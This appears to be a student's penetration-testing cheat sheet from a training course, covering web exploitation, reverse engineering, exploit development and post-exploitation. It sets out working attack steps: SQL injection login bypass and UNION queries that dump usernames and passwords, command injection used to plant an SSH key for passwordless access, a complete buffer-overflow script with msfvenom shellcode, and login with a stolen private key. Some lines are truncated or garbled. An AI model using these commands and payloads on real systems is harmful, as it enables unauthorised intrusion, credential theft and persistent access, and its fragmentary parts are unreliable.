  - Make the golden statement by `UNION SELECT 1,2,3` to figure out the order of the tables. Then print out the entirety of the tables.
* Directory Traversal
  - Files to search for
* Malicious File Upload
  - Do not upload files if you dont know what directory the files are going to
* Command Injection
  - `Whoami`
  - Semicolons before commands

## steps 
# to exploit a webpage: 
  nmap --script=http-enum <ip>
  after nmap you type in the directories found at the search bar (fefwwsfews/img or /admin)

  then you generate your key
      ssh-keygen -t rsa -b 4096
      cat  /.ssh/id_rsa.pub
      echo "your key from the cat" > /var/www/.ssh/authorized_keys
  
  then you replace the ssh keys with your own so you dont need a password to get on the box and make sure to create the authorized_keys file in www user with and using the echo command above will place your key in it allowing free ssh usage and no password
    ; mkdir /var/www/.ssh
   # on a webpage in the search bar you need a ; before every command 


## sql injections 
if brought to a webpage with multiple links or with catalogues use these
' OR 1='1â€™      will authenticate and bypass a login 
# Once we got in, we opened the developer console (inspect) and found a username variable
# Make sure to click the radio button to see information in RAW format
# We then copied that variable added a "?" to the url because we are passing information and pasted the variable
# After doing this we were shown usernames and passwords in that variable

identify columns with <vulnerable item>' UNION SELECT 1,2,3,4,5 #

<item>' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
    allows to see tables, 2 and 5 are placeholders because we need a certain number of columns found via the 1=1  but because we only need 3 columns, we need 2 and 5 because the PAGE needs 5 columns

# use the GET method 
# In the search bar replace & with:
OR 1=1

# Identify vulnerable field (selection 2)
?Selection=3 UNION SELECT 1,2,3

# Identify number of columns (3, displayed in 1,3,2 order)
?Selection=3 UNION SELECT 1,2,3

# Golden Statement order displayed in 1,3,2
?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns

?Selection=3 UNION SELECT id,pass,name FROM session.user

' UNION SELECT table_schema,table_name FROM information_schema.columns

## rev engineering 
run the exe or binary against strings with
    .\downloads\SYSINTERNALS\strings.exe .\downloads\.exe
then import to ghidra and analyze
then find the "success!" statement and work up and analyze what the code is doing 

## exploit developement
## for linux 
  *STEP 1 env - gdb ./.exe
  2. overload the file with a lot of characters 
  2a. once acquired the segmentation fault paste the EIP value in the buffer opverflow generator and use that as your buffer, 
  3. show env then unset env <variable except ourself like lines and columns>
  4. run info proc map 
  5. run find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
  6. tale first 4 (really 1) and convert it to little endian and make that your EIP
  7. use msfvenom to generate shellcode 
        msfvenom -p /linux/x86/exec CMD=<command to execute> -b '\x00' -f python
        msfvenom --list payloads
      ## how to generate shell code via msfconsole
payload/linux/x86/exec
show options 
set cmd whoami
    then show options to verify

## your script to get the code to work should be this (shell code is buf and is variable)
!/usr/bin/env python 
   
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"   first endian from info proc map (our linops)
nop = "\x90" * 15    nop sled
buf =  b""
buf += b"\xbb\x35\x5d\x8c\xf4\xd9\xed\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x83\xea\xfc\x03\x5a"
buf += b"\x10\xd7\xa8\xe6\xff\x4f\xca\xa5\x99\x07\xc1\x2a"      shellcode 
buf += b"\xef\x30\x71\x82\x9c\xd6\x82\xb4\x4d\x44\xea\x2a"
buf += b"\x1b\x6b\xbe\x5a\x1c\x6b\x3f\x9b\x54\x03\x50\xfa"
buf += b"\xf7\xba\xae\xab\x54\xb5\x4e\x9e\xdb"
print(buffer+eip+nop+buf)
    
8.  ## run <<< $(./buffer.py)            runs the file loaded with the file command and runs it with thescript 
## Starting program: /home/student/SECURITY/inventory.exe <<< $(./buffer.py) (how its running)

when you see a strcopy string its vulnerable to overflow
netstat -anob
task manager > performance > open resource monitor to see what port and processes run 
use: nc <your ip> <port opened by 

# windows exploit dev


## post exploitation 
scp -P 2323 <file> creds@127.0.0.1:/destination/location   # puts your file on a local machine to a remote system
scp -P 2323 creds@127.0.0.1:/remote/file.txt .    #grabs a file from a remote system

#### SSH Keys
* Bring private key to your own box
* On your box:
  - `chmod 600 /home/student/stolenkey` # place stolen key
  - `ssh -i /home/student/stolenkey jane@1.2.3.4`   # use the key stored in home then regular ssh syntax
 

## privilege escalation
